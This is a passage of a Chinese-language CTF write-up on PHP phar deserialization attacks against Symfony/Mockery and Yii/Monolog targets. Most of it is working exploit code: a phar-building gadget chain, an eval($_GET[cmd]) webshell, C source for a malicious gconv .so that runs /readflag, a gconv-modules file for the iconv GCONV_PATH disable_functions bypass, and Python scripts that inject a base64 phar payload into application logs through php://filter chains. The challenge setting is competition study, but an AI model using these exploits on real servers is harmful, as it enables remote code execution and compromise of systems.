            private $method;
            public function __construct($class){
                $this->mock = $class;
                $this->method = 'generate';
            }
        }
    }
    namespace PHPUnit\Framework\MockObject{
        final class MockTrait{
            private $classCode;
            private $mockName;
            public function __construct(){
                $this->classCode = "phpinfo();";
                $this->mockName  = 'jiang';
            }
        }
    }
    namespace{
        use \Symfony\Component\Routing\Loader\Configurator\ImportConfigurator;
        use \Mockery\HigherOrderMessage;
        use \PHPUnit\Framework\MockObject\MockTrait;
        $m = new MockTrait();
        $h = new HigherOrderMessage($m);
        $i = new ImportConfigurator($h);
        $phar = new Phar("phar.phar");
        $phar -> startBuffering();
        $phar -> addFromString("test.txt","test");
        $phar -> setStub("GIF89a"."");
        $phar -> setMetadata($i);
        $phar -> stopBuffering();
        echo base64_encode(file_get_contents('phar.phar'));
    }
    ?>
将payload 带进上面的 exp，打不通？这就是 在后面加’A’的问题了，去掉就可以了。
ban了 `iconv` 和`iconv_strlen`。 有猫腻哈哈。留了 `putenv`，但还ban了 `mail` 应该就是利用
`php://filter` 中的 `iconv`转换器来加载恶意so 了，还开了 `open_basedir`
漏洞原型如下
先写一个可持续利用log 吧，不然每次都要重新打，很烦。
`jiang.phar` 内容是一个 `eval($_GET[cmd])`的木马
用`glob` 和 `ini_set`都没绕过 这`open_basedir`，很奇怪。
guoke师傅的wp里说 有 `/readflag`，
在传入 `.so` 文件和 `module`文件的时候，不能从远程`vps` 上下载，只能分段传输了，切记 分段传输的时候
文件的完整性，如果最后没打通，来检查检查 `.so`文件是否完整。
    #include 
    #include 
    void gconv() {}
    void gconv_init() {
      system("/readflag > /tmp/flag");
      exit(0);
    }
    gcc payload.c -o payload.so -shared -fPIC
    gconv-modules
    module  PAYLOAD//    INTERNAL    ../../../../../../../../tmp/payload    2
    module  INTERNAL    PAYLOAD//    ../../../../../../../../tmp/payload    2
在exp 中加入这个函数，跑就好了，上面的 `write`函数可以不用执行了，记得修改`phar://`。
    def read():
      parm="?cmd=print_r(scandir('/tmp'));putenv('GCONV_PATH=/tmp/');file_put_contents('php://filter/write=convert.iconv.payload.utf-8/resource=/tmp/jiang','jiang');"
      res=requests.request("POST", url=url+parm, headers=headers, data=getpayload(file4))
      while 'flag' not in res.text:
        res=requests.request("POST", url=url+parm, headers=headers, data=getpayload(file4))
        print('continue')
      parm="?cmd=echo file_get_contents('/tmp/flag');"
      res=requests.request("POST", url=url+parm, headers=headers, data=getpayload(file4))
      print(res.text.split('')[1])
    read()
这里比较玄学，因为在转换器触发.so 文件的时候，并不一定会成功，第一次做的时候 十几次，写wp再做的时候 跑了上百次，多发几次。（ fuck 我加的
###  CISCN filter
题目就给了个 `composer.json`文件 和 控制器，hint是 log的配置
log可以写进本地配置自己打的，在`config/web.config` 里
同样是把报错内容写进 日志里。
不一样的是，日志的 `payload(xxxxxxx)` 只出现了一次，
我们 编码后的`payload` 一定是偶数，
前偶后偶，不用加前缀了，直接打`payload`就可以了诶。
本地环境可能有些问题，牛头不对马嘴了
这两个日志不同的 是 ??? 没了。
长度还变成了 奇数个。
不过不影响，因为我们 payload前面是不变的偶数，影响的只有后面，只有保证后面是偶数个，在 `utf-16le->utf-8` 的时候不报错就OK。
加一个 A 就行。
这道题的坑在
这里，
yii这个版本没可用的链子。
需要用 `monolog`组件的链子打
exp如下
    import requests
    import os
    s='PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQq+AgAAAgAAABEAAAABAAAAAABnAgAATzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6Njoic29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7TzoyOToiTW9ub2xvZ1xIYW5kbGVyXEJ1ZmZlckhhbmRsZXIiOjc6e3M6MTA6IgAqAGhhbmRsZXIiO047czoxMzoiACoAYnVmZmVyU2l6ZSI7aTotMTtzOjk6IgAqAGJ1ZmZlciI7YToxOntpOjA7YToyOntpOjA7czo0OiJjYWxjIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6Njoic3lzdGVtIjt9fXM6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6NDoiY2FsYyI7czo1OiJsZXZlbCI7Tjt9fXM6ODoiACoAbGV2ZWwiO047czoxNDoiACoAaW5pdGlhbGl6ZWQiO2I6MTtzOjE0OiIAKgBidWZmZXJMaW1pdCI7aTotMTtzOjEzOiIAKgBwcm9jZXNzb3JzIjthOjI6e2k6MDtzOjc6ImN1cnJlbnQiO2k6MTtzOjY6InN5c3RlbSI7fX19BQAAAGR1bW15BAAAAHsMpWAEAAAADH5/2KQBAAAAAAAACAAAAHRlc3QudHh0BAAAAHsMpWAEAAAADH5/2KQBAAAAAAAAdGVzdHRlc3SLzw7MRTDv+IZ+8iRcMtNeQdjWsQIAAABHQk1C'
    payload=''.join(["=" + hex(ord(i))[2:] + "=00" for i in s]).upper()
    url = "http://localhost:8080/?file="
    proxies = {
      "http": None,
      "https": None,
    }
    # 清空
    file1='php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../runtime/logs/app.log'
    #payload
    file2=payload
    # 清楚干扰字
    file3='php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../runtime/logs/app.log'
    file4='phar://../runtime/logs/app.log'
    def write():
      res = requests.get(url=url+file1,proxies=proxies)
      while 'Congratulations!' not in res.text:
        res = requests.get(url=url+file1,proxies=proxies)
      #题目环境可能 payload前面偶数后奇数，所以后面再加以个 A （payload永远偶数）
      #requests.get(url=url+'AA',proxies=proxies) #题目环境的日志可能不一样，如果加上A 出错，不加A 出不来，就把这个注释去掉
      requests.get(url=url+file2+'A',proxies=proxies) # 本地如果加了A 出错，就把A去掉，
      res = requests.get(url=url+file3,proxies=proxies)
      if 'Congratulations!' not in res.text:
        print('重来！！')
      else:
        print('写入成功')
        read()
    def read():
      res=requests.get(url=url+file4,proxies=proxies)
      print(res.text)
    write()
这是弹计算器的，buu上复现的话，记得换`payload`。
每个人的目录结构不同，日志也会不一样，原理大抵如此，如果有遇到什么问题还请告知，还有爱春秋春季赛TP5.1.41的类似问题，也方便解答。
参考